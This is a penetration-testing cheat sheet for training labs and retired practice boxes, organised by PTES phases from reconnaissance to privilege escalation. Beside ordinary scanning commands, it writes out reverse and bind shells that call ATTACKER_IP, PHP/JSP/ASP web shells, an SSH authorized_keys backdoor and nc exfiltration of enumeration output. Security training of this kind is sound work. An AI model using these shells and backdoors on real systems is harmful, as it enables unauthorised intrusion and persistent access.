+++
title = "Cyber Cheatsheet v2"
type = "home"
+++

# Meta: **Penetration Testing Execution Standard (PTES)**

- http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines

| **Step** | **Task**                                                                                                                                                                                                                                                                                                                                                                 |
| -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1.       | Get the user flag on your own                                                                                                                                                                                                                                                                                                                                            |
| 2.       | Get the root flag on your own                                                                                                                                                                                                                                                                                                                                            |
| 3.       | Write your **technical** documentation                                                                                                                                                                                                                                                                                                                                   |
| 4.       | Write your **non-technical** documentation                                                                                                                                                                                                                                                                                                                               |
| 5.       | Compare your notes with the official write-up                                                                                                                                                                                                                                                                                                                            |
| 6.       | Create a list of information you have missed                                                                                                                                                                                                                                                                                                                             |
| 7.       | Watch video or read blog walkthrough and compare it with your notes<br>- https://www.youtube.com/@ippsec/videos<br>- https://ippsec.rocks/?# <br>- https://www.youtube.com/@vbscrub/videos <br> - https://www.youtube.com/watch?v=CU9Iafc-Igs&list=PLF7JR1a3dLONdkRYU_8-5OcgOzrWe2549 <br> - https://www.youtube.com/@LiveOverflow/videos <br> - https://0xdf.gitlab.io/ |
| 8.       | Expand your notes and documentation by adding the missed parts                                                                                                                                                                                                                                                                                                           |

- PowerShell: https://underthewire.tech/wargames
- Linux Terminal: https://overthewire.org/wargames/

- Tmux:
    - https://tmuxcheatsheet.com/
    - https://www.youtube.com/watch?v=Lqehvpe_djs
- Vim:
    - https://vimsheet.com/

## Recommended Retired Boxes

- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

| Box                                                                                           |                                                                                                                                                                                                                                |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)                                 | Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire [OWASP Top Ten](https://owasp.org/www-project-top-ten) along with many other real-world application security flaws. |
| [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) | Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.                                                                                                     |
| [Metasploitable 3](https://github.com/rapid7/metasploitable3)                                 | Is a template for building a vulnerable Windows VM configured with a wide range of [vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities).                                                          |
| [DVWA](https://github.com/digininja/DVWA)                                                     | This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.                                                                                      |

---
# Pre-Engagement

## 3rd Parties (Infrastructure)

- AWS: https://aws.amazon.com/es/security/penetration-testing/

## Sensitive Data Regulations

- UK: https://www.gov.uk/data-protection
- US:
    - General: https://www.ftc.gov/business-guidance/privacy-security
    - Financial: https://www.ftc.gov/business-guidance/privacy-security/gramm-leach-bliley-act
    - Health: https://www.hhs.gov/hipaa/index.html

# Information Gathering/Intelligence Gathering

- Ports:
    - https://www.stationx.net/common-ports-cheat-sheet/
    - https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf
    - https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

## Scanning

```bash
# TCP
nc -nvzw5 <TARGET> <PORT>
# UDP
nc -unvzw5 <TARGET> <PORT>
```

## Nmap

- **`Open`** - received SYN-ACK
- **`Closed`** - received RST
- **`Filtered`** - no response
- **`Unfiltered`** - Nmap can't determine the state, but the port is accessible (seen with `-sA` ACK scans)
- **`Open/Filtered`** - Nmap can't tell if the port is open or blocked by a firewall
- **`Closed/Filtered`** - Nmap can't tell if the port is closed or blocked by a firewall

Filtering out live hosts for `-iL`:

```bash
# Find Live Hosts
sudo nmap -n -sn --reason -oA host_disc
# Create list
grep 'Status: Up' host_disc.gnmap | awk '{print $2}' > live_hosts.txt
# Scan normally w/ list
sudo nmap -n -Pn -sV -sC -oA host_disc_live -iL live_hosts.txt
```


### Webservers

- OWASP Top 10:
    - https://owasp.org/www-project-top-ten/
- HTTP Codes:
    - https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#Standard_codes
- Web Page Scanner:
    - https://github.com/RedSiege/EyeWitness

```bash
# HTTP Headers + robots.txt
curl -skLI -o curl_http_headers.txt http://<TARGET>
curl -skL -o curl_robots.txt http://<TARGET>/robots.txt

===

# Enum web server + version + OS + frameworks + libraries
whatweb --aggression 3 http://<TARGET> --log-brief=whatweb_scan.txt

# Enum web server vulns
nikto -o nikto_scan.txt -h http://<TARGET>

# Enum web app logic & vulns
wapiti -f txt -o wapiti_scan.txt --url http://<TARGET>

===

# NOTE: bigger list 
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Directory brute-force with a common wordlist
gobuster --quiet --threads 64 --output gobuster_dir_common dir --follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url http://<TARGET>

# w/ file extensions
gobuster --quiet --threads 64 --output gobuster_dir_medium dir ---follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --extensions php,html,txt,bak,zip --url http://<TARGET>

### FEROXBUSTER: faster and recursive
feroxbuster -t 64 -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 2 -o feroxbuster_dir_common -u http://<TARGET>
```

# Vulnerability Assessment/Analysis

```bash
# List SMB shares w/o password
smbclient -N --list <TARGET> > smb_shares.txt

# Connect to SMB share w/ a null session (no password)
smbclient -N //<TARGET>/<SHARE>

# Connect to SMB share with password
smbclient --password=<PASSWORD> '\\<HOSTNAME>\<SHARE>'
```

```bash
# - SNMPv1/v2c use a plaintext **Community String** for access.
# - Default Strings: **`public`** (Read-Only) and **`private`** (Read/Write) are common.
onesixtyone -c <WORDLIST> <TARGET_IP>

# .1.3.6.1.2.1.1.1.0      System Description (OS, version)
# .1.3.6.1.2.1.1.5.0      System Name (Hostname)
# .1.3.6.1.2.1.25.1.1.0   System Uptime
# .1.3.6.1.2.1.25.4.2.1.2 List of all running processes. Check for passwords in arguments
# .1.3.6.1.2.1.4.20       IP Address and Routing Table information
snmpwalk -v <VERSION> -c <COMMUNITY_STRING> <TARGET_IP> <OID>
```

# Exploitation

- Exploit DBs
    - https://www.exploit-db.com/
    - https://www.rapid7.com/db/
    - https://www.vulnerability-lab.com/

## Reverse Shells

- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- URL ENCODE: https://www.urlencoder.org/

```bash
# === ATTACKER: LISTENER ===
nc -lvnp <CALLBACK_PORT>

# === TARGET: CALLBACKS ===
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<CALLBACK_PORT> 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <CALLBACK_PORT> >/tmp/f

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<CALLBACK_PORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## Bind Shells

- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/

```bash
# === TARGET: LISTENER ===
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <LISTEN_PORT> >/tmp/f

python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<LISTEN_PORT>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<LISTEN_PORT>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

# === ATTACKER: CONNECT ===
nc <TARGET> <LISTEN_PORT>
```

```shell
# === SHELL UPGRADE ===
for i in python3 python python2; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit; done
script /dev/null -c /bin/bash

export TERM=xterm-256color

CTRL+Z
stty raw -echo ; fg

echo "MAKE SURE THIS IS RAN ON ATTACKER BOX, THEN...\n\nON TARGET SHELL:\nstty rows $(tput lines) columns $(tput cols)"
```

## Web Shells

- `/usr/share/webshells`
- Beachhead: https://github.com/flozz/p0wny-shell
- Post-Exploit: https://github.com/wso-shell-php/.github
- https://github.com/payloadbox/command-injection-payload-list

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

### Command executor

```php
echo '<?php if(isset($_GET["debug"])) system($_GET["debug"]); ?>' > debug.php

curl -skL -o- http://<TARGET>/debug.php?debug=<COMMAND>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

## File Transfer

- https://cheatography.com/fred/cheat-sheets/file-transfers/

```bash
# === HTTP ===
sudo python3 -m http.server 80

# === HTTPS Server ===
openssl req -new -x509 -keyout https_server_cert.pem -out https_server_cert.pem -days 365 -nodes

sudo python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='https_server_cert.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

# Post-Exploitation

## Backdoor Access

```bash
# Attacker
ssh-keygen -f ./target_backdoor_key -N "" -C "service@localhost" && echo "\n\necho '$(cat ./target_backdoor_key.pub)' >> ~/.ssh/authorized_keys\n\n"

# Target: !!! RUN COMMAND ABOVE !!!

# Attacker
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./target_backdoor_key <USER>@<TARGET>
```

## Privilege Escalation (PrivEsc)

**NOTE:** scripts are noisy for any sort of monitoring software, so manual checks may be preferred

### Linux

- https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
- https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
- https://gtfobins.github.io/

#### linPEAS

```bash
# === ATTACKER ===
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
ip a ; python3 -m http.server 8000

# === TARGET ===
cd /tmp
wget http://<IP_ADDR>:8000/linpeas.sh
chmod +x linpeas.sh
REGEXES="0" ./linpeas.sh 2>&1 | tee linpeas_output.txt

# === KALI ===
scp <USER>@<TARGET>:/tmp/linpeas_output.txt ~/
# NC
nc -l -p <PORT> > ~/linpeas_output.txt
cat /tmp/linpeas_output.txt | nc <ATTACKER_IP> <PORT>
# wait a moment, then CTRL+C
```

```bash
dpkg -l

sudo -l

cat /etc/crontab /var/spool/cron/crontabs/root
ls -la /etc/cron.d/

ls -la /home/*/.ssh/
ls -la /root/.ssh/
```

### Windows

- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- https://github.com/GhostPack/Seatbelt
- https://lolbas-project.github.io/#

```bash
for %f in ("C:\Program Files", "C:\Program Files (x86)") do @(echo. && echo --- Listing: %~f --- && dir "%~f" /b)
```

# Lateral Movement

# Proof-of-Concept/Reporting

# Post-Engagement
